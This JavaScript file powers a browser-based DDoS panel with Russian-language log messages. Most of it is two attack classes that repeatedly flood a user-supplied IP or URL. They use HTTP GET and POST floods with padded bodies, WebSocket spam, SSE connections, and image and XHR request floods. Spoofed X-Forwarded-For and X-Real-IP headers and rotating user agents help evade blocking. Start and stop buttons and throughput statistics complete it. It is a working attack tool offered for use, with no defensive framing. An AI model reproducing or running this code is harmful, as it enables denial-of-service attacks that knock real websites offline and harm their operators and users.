document.addEventListener('DOMContentLoaded', function () {
    particlesJS('particles-js', {
        particles: {
            number: { value: 80, density: { enable: true, value_area: 800 } },
            color: { value: ['#00ff88', '#00ccff', '#ff00cc', '#8a2be2'] },
            shape: { type: 'circle' },
            opacity: { value: 0.5, random: true },
            size: { value: 3, random: true },
            line_linked: { enable: true, distance: 150, color: '#8a2be2', opacity: 0.2, width: 1 },
            move: { enable: true, speed: 2, direction: 'none', random: true, straight: false, out_mode: 'out', bounce: false, attract: { enable: true, rotateX: 600, rotateY: 1200 } }
        },
        interactivity: {
            detect_on: 'canvas',
            events: { onhover: { enable: true, mode: 'repulse' }, onclick: { enable: true, mode: 'push' }, resize: true },
            modes: { repulse: { distance: 100, duration: 0.4 }, push: { particles_nb: 4 } }
        },
        retina_detect: true
    });

    const logoContainer = document.querySelector('.logo-container');
    if (logoContainer) {
        logoContainer.style.opacity = '0';
        logoContainer.style.transform = 'translateY(-20px)';
        setTimeout(() => {
            logoContainer.style.transition = 'all 0.5s ease';
            logoContainer.style.opacity = '1';
            logoContainer.style.transform = 'translateY(0)';
        }, 500);
    }

    const panels = document.querySelectorAll('.panel');
    panels.forEach((panel, index) => {
        panel.style.opacity = '0';
        panel.style.transform = 'translateY(30px)';
        setTimeout(() => {
            panel.style.transition = 'all 0.6s ease';
            panel.style.opacity = '1';
            panel.style.transform = 'translateY(0)';
        }, 800 + (index * 200));
    });

    class DDoSAttack {
        constructor() {
            this.isAttacking = false;
            this.threadCount = 50;
            this.packetsPerSecond = 10000;
            this.sentPackets = 0;
            this.successfulPackets = 0;
            this.failedPackets = 0;
            this.attackInterval = null;
            this.statsInterval = null;
            this.currentTerminal = null;
            this.attackStartTime = null;
        }

        parseTarget(target) {
            let ip, port, protocol = 'http';
            if (target.includes('http')) {
                try {
                    const url = new URL(target.startsWith('http') ? target : `http://${target}`);
                    ip = url.hostname;
                    port = url.port || (url.protocol === 'https:' ? 443 : 80);
                    protocol = url.protocol.replace(':', '');
                } catch (e) { return null; }
            } else if (target.includes(':')) {
                [ip, port] = target.split(':');
                port = parseInt(port);
            } else { ip = target; port = 80; }
            return { ip, port: port || 80, protocol };
        }

        async sendHTTPPackets(target) {
            const requests = [];
            const userAgents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'];
            for (let i = 0; i < 50; i++) {
                const request = fetch(`${target.protocol}://${target.ip}:${target.port}/`, { method: 'GET', mode: 'no-cors', cache: 'no-cache', headers: { 'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)], 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'Cache-Control': 'no-cache', 'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}` } }).then(() => { this.sentPackets++; this.successfulPackets++; this.addPacketLog(this.currentTerminal, 'HTTP', `${target.ip}:${target.port}`, 200); return { status: 200 }; }).catch((error) => { this.sentPackets++; this.failedPackets++; this.addPacketLog(this.currentTerminal, 'HTTP', `${target.ip}:${target.port}`, 400); return { status: 400 }; });
                requests.push(request);
            }
            await Promise.allSettled(requests);
        }

        async sendPOSTPackets(target) {
            const requests = [];
            for (let i = 0; i < 30; i++) {
                const formData = new URLSearchParams();
                for (let j = 0; j < 100; j++) { formData.append(`field${j}`, 'X'.repeat(1000)); }
                const request = fetch(`${target.protocol}://${target.ip}:${target.port}/`, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'X-Request-ID': Math.random().toString(36).substr(2, 16) }, body: formData.toString() }).then(() => { this.sentPackets++; this.successfulPackets++; this.addPacketLog(this.currentTerminal, 'POST', `${target.ip}:${target.port}`, 200); return { status: 200 }; }).catch(() => { this.sentPackets++; this.failedPackets++; this.addPacketLog(this.currentTerminal, 'POST', `${target.ip}:${target.port}`, 400); return { status: 400 }; });
                requests.push(request);
            }
            await Promise.allSettled(requests);
        }

        sendWSConnectionPackets(target) {
            for (let i = 0; i < 20; i++) {
                try {
                    const ws = new WebSocket(`ws://${target.ip}:${target.port}`);
                    ws.onopen = () => { this.sentPackets++; this.successfulPackets++; this.addPacketLog(this.currentTerminal, 'WS', `${target.ip}:${target.port}`, 200); ws.send('X'.repeat(1024)); setTimeout(() => ws.close(), 100); };
                    ws.onerror = () => { this.sentPackets++; this.failedPackets++; this.addPacketLog(this.currentTerminal, 'WS', `${target.ip}:${target.port}`, 400); };
                } catch (error) { this.sentPackets++; this.failedPackets++; this.addPacketLog(this.currentTerminal, 'WS', `${target.ip}:${target.port}`, 400); }
            }
        }

        async startAttack(targetInput, terminal) {
            const target = this.parseTarget(targetInput);
            if (!target) { this.addLog(terminal, '❌ Неверный формат цели. Используйте: IP:port или http://site.com', 'error'); return; }
            this.isAttacking = true; this.currentTerminal = terminal; this.sentPackets = 0; this.successfulPackets = 0; this.failedPackets = 0; this.attackStartTime = Date.now();
            this.addLog(terminal, `🎯 Начинаем атаку на: ${target.ip}:${target.port}`, 'info'); this.addLog(terminal, `⚡ Потоки: ${this.threadCount} | Пакетов/сек: ${this.packetsPerSecond}`, 'info'); this.addLog(terminal, `🚀 Используемые протоколы: HTTP, POST, WebSocket`, 'info'); this.addLog(terminal, `📡 Статус: АКТИВНА`, 'success');
            this.attackInterval = setInterval(async () => {
                if (!this.isAttacking) return;
                try { await Promise.all([ this.sendHTTPPackets(target), this.sendPOSTPackets(target) ]); this.sendWSConnectionPackets(target); } catch (error) { console.error('Attack error:', error); }
            }, 100);
            this.statsInterval = setInterval(() => {
                if (!this.isAttacking) return;
                const currentTime = Date.now(); const elapsedSeconds = (currentTime - this.attackStartTime) / 1000; const packetsPerSecond = elapsedSeconds > 0 ? Math.round(this.sentPackets / elapsedSeconds) : 0;
                this.addLog(terminal, `📊 Статистика: Отправлено: ${this.sentPackets} | Успешно: ${this.successfulPackets} | Ошибок: ${this.failedPackets} | Скорость: ${packetsPerSecond} пак/сек`, 'info');
            }, 3000);
        }

        stopAttack(terminal) {
            this.isAttacking = false; this.currentTerminal = null;
            if (this.attackInterval) { clearInterval(this.attackInterval); this.attackInterval = null; }
            if (this.statsInterval) { clearInterval(this.statsInterval); this.statsInterval = null; }
            const totalTime = ((Date.now() - this.attackStartTime) / 1000).toFixed(1); const packetsPerSecond = totalTime > 0 ? (this.sentPackets / totalTime).toFixed(0) : 0; const efficiency = this.sentPackets > 0 ? ((this.successfulPackets / this.sentPackets) * 100).toFixed(1) : 0;
            this.addLog(terminal, `🛑 Атака остановлена. Время: ${totalTime} сек`, 'info'); this.addLog(terminal, `📈 Итого: ${this.sentPackets} пакетов (${packetsPerSecond} пак/сек)`, 'info'); this.addLog(terminal, `✅ Успешно: ${this.successfulPackets} | ❌ Ошибок: ${this.failedPackets}`, 'info'); this.addLog(terminal, `📡 Эффективность: ${efficiency}%`, 'info');
        }

        addLog(terminal, message, type = 'info') {
            if (!terminal) return;
            const logLine = document.createElement('div'); logLine.className = 'terminal-line';
            const timestamp = new Date().toLocaleTimeString(); const prefix = type === 'error' ? '❌' : type === 'success' ? '✅' : '📝';
            logLine.innerHTML = `<span style="color: #888">[${timestamp}]</span> ${prefix} ${message}`; terminal.appendChild(logLine);
            terminal.scrollTop = terminal.scrollHeight;
        }

        addPacketLog(terminal, type, target, status) {
            if (!terminal) return; if (Math.random() > 0.1) return;
            const logLine = document.createElement('div'); logLine.className = 'terminal-line'; logLine.style.fontSize = '11px'; logLine.style.fontFamily = "'Courier New', monospace";
            const timestamp = new Date().toLocaleTimeString(); const statusColor = status === 200 ? '#00ff88' : '#ff4444'; const statusText = status === 200 ? '200' : '400';
            logLine.innerHTML = `<span style="color: #666">[${timestamp}]</span> <strong style="color: #8a2be2">${type}</strong> - пакет отправлен на <span style="color: #00ccff">${target}</span>, статус: <span style="color: ${statusColor}; font-weight: bold">${statusText}</span>`; terminal.appendChild(logLine);
            terminal.scrollTop = terminal.scrollHeight;
        }
    }

    class WebDDoSAttack {
        constructor() {
            this.isAttacking = false; this.sentPackets = 0; this.successfulPackets = 0; this.failedPackets = 0; this.attackInterval = null; this.statsInterval = null; this.currentTerminal = null; this.attackStartTime = null; this.userAgents = []; this.loadUserAgents();
        }

        async loadUserAgents() {
            try { const response = await fetch('/ddos/user.json'); this.userAgents = await response.json(); } catch (error) { console.error('Failed to load user agents:', error); this.userAgents = [{ user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', proxy: null }]; }
        }

        getRandomUserAgent() { return this.userAgents[Math.floor(Math.random() * this.userAgents.length)]; }

        parseTarget(target) {
            try { const url = new URL(target.startsWith('http') ? target : `https://${target}`); return { protocol: url.protocol.replace(':', ''), hostname: url.hostname, port: url.port || (url.protocol === 'https:' ? 443 : 80), pathname: url.pathname || '/', origin: url.origin }; } catch (e) { return null; }
        }

        async sendHTTP2Flood(target) {
            const requests = []; for (let i = 0; i < 100; i++) {
                const ua = this.getRandomUserAgent(); const request = fetch(target.origin + target.pathname, { method: 'GET', headers: { 'User-Agent': ua.user_agent, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Encoding': 'gzip, deflate, br', 'Cache-Control': 'no-cache', 'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`, 'X-Real-IP': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}` } }).then(() => { this.sentPackets++; this.successfulPackets++; this.addPacketLog(this.currentTerminal, 'HTTP2', target.hostname, 200); }).catch(() => { this.sentPackets++; this.failedPackets++; this.addPacketLog(this.currentTerminal, 'HTTP2', target.hostname, 400); }); requests.push(request);
            } await Promise.allSettled(requests);
        }

        async sendWebSocketSpam(target) {
            for (let i = 0; i < 50; i++) {
                try { const ws = new WebSocket(`wss://${target.hostname}`); ws.onopen = () => { this.sentPackets++; this.successfulPackets++; this.addPacketLog(this.currentTerminal, 'WebSocket', target.hostname, 200); for (let j = 0; j < 10; j++) { ws.send(JSON.stringify({ data: 'X'.repeat(10000) })); } setTimeout(() => ws.close(), 500); }; ws.onerror = () => { this.sentPackets++; this.failedPackets++; this.addPacketLog(this.currentTerminal, 'WebSocket', target.hostname, 400); }; } catch (error) { this.sentPackets++; this.failedPackets++; }
            }
        }

        async sendSSEAttack(target) {
            for (let i = 0; i < 20; i++) {
                try { const eventSource = new EventSource(`${target.origin}/events`); eventSource.onopen = () => { this.sentPackets++; this.successfulPackets++; this.addPacketLog(this.currentTerminal, 'SSE', target.hostname, 200); }; eventSource.onerror = () => { this.sentPackets++; this.failedPackets++; eventSource.close(); }; setTimeout(() => eventSource.close(), 1000); } catch (error) { this.sentPackets++; this.failedPackets++; }
            }
        }

        async sendImageResourceFlood(target) {
            const requests = []; for (let i = 0; i < 50; i++) {
                const img = new Image(); const request = new Promise((resolve) => { img.onload = () => { this.sentPackets++; this.successfulPackets++; this.addPacketLog(this.currentTerminal, 'IMG', target.hostname, 200); resolve(); }; img.onerror = () => { this.sentPackets++; this.failedPackets++; this.addPacketLog(this.currentTerminal, 'IMG', target.hostname, 400); resolve(); }; }); img.src = `${target.origin}/image${i}.jpg?t=${Date.now()}`; requests.push(request);
            } await Promise.allSettled(requests);
        }

        async sendXHRFlood(target) {
            const requests = []; for (let i = 0; i < 50; i++) {
                const request = new Promise((resolve) => { const xhr = new XMLHttpRequest(); xhr.open('GET', target.origin + target.pathname); xhr.onload = () => { this.sentPackets++; this.successfulPackets++; this.addPacketLog(this.currentTerminal, 'XHR', target.hostname, 200); resolve(); }; xhr.onerror = () => { this.sentPackets++; this.failedPackets++; this.addPacketLog(this.currentTerminal, 'XHR', target.hostname, 400); resolve(); }; xhr.send(); }); requests.push(request);
            } await Promise.allSettled(requests);
        }

        async startAttack(targetInput, terminal) {
            const target = this.parseTarget(targetInput); if (!target) { this.addLog(terminal, '❌ Неверный формат цели. Используйте: https://example.com/', 'error'); return; }
            this.isAttacking = true; this.currentTerminal = terminal; this.sentPackets = 0; this.successfulPackets = 0; this.failedPackets = 0; this.attackStartTime = Date.now();
            this.addLog(terminal, `🎯 SUPER DDoS Web атака на: ${target.origin}`, 'info'); this.addLog(terminal, `⚡ Методы: HTTP2, WebSocket, SSE, Image Flood, XHR`, 'info'); this.addLog(terminal, `🛡️ User Agents: ${this.userAgents.length} вариантов`, 'info'); this.addLog(terminal, `📡 Статус: МАКСИМАЛЬНАЯ МОЩНОСТЬ`, 'success');
            this.attackInterval = setInterval(async () => {
                if (!this.isAttacking) return;
                try { await Promise.all([ this.sendHTTP2Flood(target), this.sendWebSocketSpam(target), this.sendSSEAttack(target), this.sendImageResourceFlood(target), this.sendXHRFlood(target) ]); } catch (error) { console.error('Web attack error:', error); }
            }, 100);
            this.statsInterval = setInterval(() => {
                if (!this.isAttacking) return;
                const currentTime = Date.now(); const elapsedSeconds = (currentTime - this.attackStartTime) / 1000; const packetsPerSecond = elapsedSeconds > 0 ? Math.round(this.sentPackets / elapsedSeconds) : 0;
                this.addLog(terminal, `📊 Web Stats: Отправлено: ${this.sentPackets} | Успешно: ${this.successfulPackets} | Ошибок: ${this.failedPackets} | Скорость: ${packetsPerSecond} пак/сек`, 'info');
            }, 3000);
        }

        stopAttack(terminal) {
            this.isAttacking = false; this.currentTerminal = null;
            if (this.attackInterval) { clearInterval(this.attackInterval); this.attackInterval = null; }
            if (this.statsInterval) { clearInterval(this.statsInterval); this.statsInterval = null; }
            const totalTime = ((Date.now() - this.attackStartTime) / 1000).toFixed(1); const packetsPerSecond = totalTime > 0 ? (this.sentPackets / totalTime).toFixed(0) : 0; const efficiency = this.sentPackets > 0 ? ((this.successfulPackets / this.sentPackets) * 100).toFixed(1) : 0;
            this.addLog(terminal, `🛑 Web атака остановлена. Время: ${totalTime} сек`, 'info'); this.addLog(terminal, `📈 Итого: ${this.sentPackets} пакетов (${packetsPerSecond} пак/сек)`, 'info'); this.addLog(terminal, `✅ Успешно: ${this.successfulPackets} | ❌ Ошибок: ${this.failedPackets}`, 'info'); this.addLog(terminal, `📡 Эффективность: ${efficiency}%`, 'info');
        }

        addLog(terminal, message, type = 'info') {
            if (!terminal) return;
            const logLine = document.createElement('div'); logLine.className = 'terminal-line';
            const timestamp = new Date().toLocaleTimeString(); const prefix = type === 'error' ? '❌' : type === 'success' ? '✅' : '📝';
            logLine.innerHTML = `<span style="color: #888">[${timestamp}]</span> ${prefix} ${message}`; terminal.appendChild(logLine);
            terminal.scrollTop = terminal.scrollHeight;
        }

        addPacketLog(terminal, type, target, status) {
            if (!terminal) return; if (Math.random() > 0.05) return;
            const logLine = document.createElement('div'); logLine.className = 'terminal-line'; logLine.style.fontSize = '11px'; logLine.style.fontFamily = "'Courier New', monospace";
            const timestamp = new Date().toLocaleTimeString(); const statusColor = status === 200 ? '#00ff88' : '#ff4444'; const statusText = status === 200 ? '200' : '400';
            logLine.innerHTML = `<span style="color: #666">[${timestamp}]</span> <strong style="color: #ff00cc">${type}</strong> - пакет отправлен на <span style="color: #00ccff">${target}</span>, статус: <span style="color: ${statusColor}; font-weight: bold">${statusText}</span>`; terminal.appendChild(logLine);
            terminal.scrollTop = terminal.scrollHeight;
        }
    }

    const ddosAttack = new DDoSAttack(); const webDDoSAttack = new WebDDoSAttack();
    const attackButtons = document.querySelectorAll('.attack-btn'); const ipTerminal = document.getElementById('ip-terminal'); const webTerminal = document.getElementById('web-terminal');

    attackButtons.forEach(button => {
        button.addEventListener('click', function() {
            const input = this.parentElement.querySelector('.ddos-input');
            if (this.classList.contains('ip-attack')) {
                if (input.value.trim()) {
                    if (ddosAttack.isAttacking) { ddosAttack.stopAttack(ipTerminal); this.querySelector('.btn-text').textContent = 'START ATTACK'; this.style.background = 'linear-gradient(135deg, #ff4444, #ff0066)'; } else { ddosAttack.startAttack(input.value, ipTerminal); this.querySelector('.btn-text').textContent = 'STOP ATTACK'; this.style.background = 'linear-gradient(135deg, #00ff88, #00cc6a)'; }
                } else { ddosAttack.addLog(ipTerminal, '❌ Ошибка: Введите целевой адрес', 'error'); }
            } else {
                if (input.value.trim()) {
                    if (webDDoSAttack.isAttacking) { webDDoSAttack.stopAttack(webTerminal); this.querySelector('.btn-text').textContent = 'START ATTACK'; this.style.background = 'linear-gradient(135deg, #ffa502, #ff7f00)'; } else { webDDoSAttack.startAttack(input.value, webTerminal); this.querySelector('.btn-text').textContent = 'STOP ATTACK'; this.style.background = 'linear-gradient(135deg, #00ff88, #00cc6a)'; }
                } else { webDDoSAttack.addLog(webTerminal, '❌ Ошибка: Введите URL сайта', 'error'); }
            }
        });
    });

    const clearButtons = document.querySelectorAll('.clear-btn'); clearButtons.forEach(button => { button.addEventListener('click', function() { const terminal = this.closest('.logs-section').querySelector('.terminal'); terminal.innerHTML = '<div class="terminal-line" style="color: #888">🗑️ Логи очищены</div>'; }); });
    const copyButtons = document.querySelectorAll('.copy-btn'); copyButtons.forEach(button => { button.addEventListener('click', function() { const terminal = this.closest('.logs-section').querySelector('.terminal'); const text = terminal.innerText; navigator.clipboard.writeText(text).then(() => { const attack = this.closest('.panel').querySelector('.ip-attack') ? ddosAttack : webDDoSAttack; attack.addLog(terminal, '📋 Логи скопированы в буфер обмена', 'success'); }); }); });
    const inputs = document.querySelectorAll('.ddos-input'); inputs.forEach(input => { input.addEventListener('keypress', function(e) { if (e.key === 'Enter') { const button = this.nextElementSibling; button.click(); } }); });
    window.addEventListener('beforeunload', function(e) { if (ddosAttack.isAttacking || webDDoSAttack.isAttacking) { e.preventDefault(); e.returnValue = 'Атака все еще выполняется. Вы уверены, что хотите покинуть страницу?'; return e.returnValue; } });
    console.log('🚀 DDoS System Initialized - Ready for attack');
});
